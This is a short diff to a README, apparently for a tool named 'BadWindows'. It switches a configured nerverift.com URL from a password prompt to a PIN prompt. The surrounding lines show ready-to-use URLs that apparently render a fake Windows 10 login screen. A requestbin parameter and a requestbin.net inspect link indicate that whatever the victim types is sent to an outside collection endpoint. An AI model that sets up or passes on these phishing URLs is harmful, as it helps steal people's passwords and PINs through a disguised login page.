@@ -66,6 +66,6 @@ Click [Here](http://requestbin.net/r/sqsblmsq?inspect)
 https://nerverift.com/client?name=User&type=password&text=white&os=windows10&return=https://github.com/agentnooby/BadWindows&profile=../i/user.png&background=../i/windows/default.jpg&requestbin=sqsblmsq
 
 ### PIN Example  
-https://nerverift.com/client?name=User&type=password&text=white&os=windows10&return=https://github.com/agentnooby/BadWindows&profile=../i/user.png&background=../i/windows/default.jpg&requestbin=sqsblmsq
+https://nerverift.com/client?name=User&type=pin&text=white&os=windows10&return=https://github.com/agentnooby/BadWindows&profile=../i/user.png&background=../i/windows/default.jpg&requestbin=sqsblmsq
 
 **Copyright (c) 2020 agentnooby**
